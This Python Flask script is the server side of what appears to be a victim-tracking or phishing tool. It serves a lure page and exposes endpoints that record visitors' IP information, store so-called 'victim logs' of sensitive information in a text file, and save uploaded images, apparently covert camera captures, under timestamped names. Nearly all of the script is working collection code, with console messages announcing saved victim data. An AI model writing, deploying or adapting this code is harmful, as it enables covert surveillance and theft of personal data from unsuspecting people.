from colorama import Fore, Back, Style
from flask import Flask, render_template, url_for, request, jsonify,Response
import time
import os
if(os.path.exists('image')):
       print("present")
else:
     os.mkdir('image')       
PATH_TO_IMAGES_DIR = 'image'
app = Flask(__name__)
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/')
def index():
   return Response(open('index.html').read(), mimetype="text/html")
@app.route('/ipinfo',methods=['POST'])
def ipinfos():
      iplogs = request.get_json()
      ips = open('ipinfo.txt','a')
      ips.write("\n")
      ips.write(str(iplogs))
      ips.write("\n")
      ips.close()
      print(Fore.MAGENTA + "----------------------------------------------------")
      print("")     
      print(Fore.RED  + "Ip Logs saved to **ipinfo.txt** ")  
      print("")
      print(Fore.MAGENTA + "----------------------------------------------------")
      print(" ")
      results = {'processed': 'true'}
      return jsonify(results) 

@app.route('/process_qtc', methods=['POST', 'GET'])
def getvictimlogs():
  if request.method == "POST":
    logs = request.get_json()
    log = open('sensitiveinfo.txt','a')
    log.write("\n")
    log.write(str(logs))
    log.write("\n")
    log.close()
    
    
   
    print(logs)
    print("")
    print(Fore.MAGENTA + "----------------------------------------------------")
    print("")     
    print(Fore.RED  + "Victim Logs saved  to **sensitiveinfo.txt**")  
    print("")
    print(Fore.MAGENTA + "----------------------------------------------------")
    
    results = {'processed': 'true'}
    return jsonify(results)   
@app.route('/image', methods=['POST'])
def image():

    i = request.files['image']  # get the image
    f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
    i.save('%s/%s' % (PATH_TO_IMAGES_DIR, f))
    print(Fore.YELLOW + "Image Saved Successfully")

    return Response("%s saved" % f)


if __name__ == "__main__":
  app.run(debug=False,host='0.0.0.0')
